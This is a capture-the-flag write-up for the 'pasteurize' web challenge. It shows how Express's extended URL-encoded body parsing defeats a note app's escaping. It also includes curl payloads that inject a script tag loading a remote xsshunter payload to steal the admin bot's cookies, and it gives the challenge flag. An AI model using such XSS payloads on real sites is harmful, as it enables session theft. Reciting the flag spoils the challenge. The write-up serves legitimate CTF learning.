# web/pasteurize

## info

> This doesn't look secure. I wouldn't put even the littlest secret in here.
> My source tells me that third parties might have implanted it with their little treats already. 
> Can you prove me right?
> 
> https://pasteurize.web.ctfcompetition.com/

## writeup

After submiting the form with a random value we inspect the source and see

```html
<!-- TODO: Fix b/1337 in /source that could lead to XSS -->
```

We have access to the source code of the app!  
Looks like a node app running an express server.  
After some digging some interesting parts fall into view:

1. The route to view a note uses a small function to escape our note content  
   
   ```javascript
   JSON.stringify(unsafe).slice(1, -1).replace(/</g, '\\x3C').replace(/>/g, '\\x3E')
   ```
   
   preventing us from inserting `<tags>` directly.

2. The escaped note gets passed to the view template and renders in a script tag on the site `const note = "asd";`.

If we find a way to "leave" the string and execute our own javascript we're in business!  
After reviewing the source and paying attention to the *developer comments*, one hits the eye:

```javascript
/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
      extended: true
}));
```

If we investigate the express [bodyparser](http://expressjs.com/en/resources/middleware/body-parser.html#bodyparserurlencodedoptions) middleware we find:

> The “extended” syntax allows for **rich objects and arrays** to be encoded into  the URL-encoded format, allowing for a JSON-like experience with URL encoded. For more information, please [see the qs library](https://www.npmjs.com/package/qs?spm=a2c6h.14275010.0.0.5bd529bf7ywTul#readme).

Nice, that means we can pass more than a simple string.  
In the qs library we can read how to use it:

> qs allows you to create nested objects within your query strings, by surrounding the name of sub-keys with square brackets []. For example, the string `foo[bar]=baz` converts to:

```javascript
assert.deepEqual(qs.parse('foo[bar]=baz'), {
    foo: {
        bar: 'baz'
    }
});
```

### attack

If we start playing with a few payloads

```shell
curl -X POST https://pasteurize.web.ctfcompetition.com/ -d "content[foo]=bar"
```

and look at the results

```javascript
const note = ""foo":"bar"";
// Uncaught SyntaxError: unexpected token: identifier
```

we'll see that we found our **attack vector!**  
Now we craft our small exploit by creating and appending a script tag with our malicious code.

> I use [xsshunter.com](https://xsshunter.com) at this point

```shell
curl -X POST https://pasteurize.web.ctfcompetition.com/ -d "content[1]=;a=document.createElement('script');a.src='https://pwn.xss.ht';document.body.append(a);"
```

Make sure that *TJMike* downloads our xss payload by visting the *"share with TJMike"* link and after a short while we find the flag in his cookies: `CTF{Express_t0_Tr0ubl3s}`.
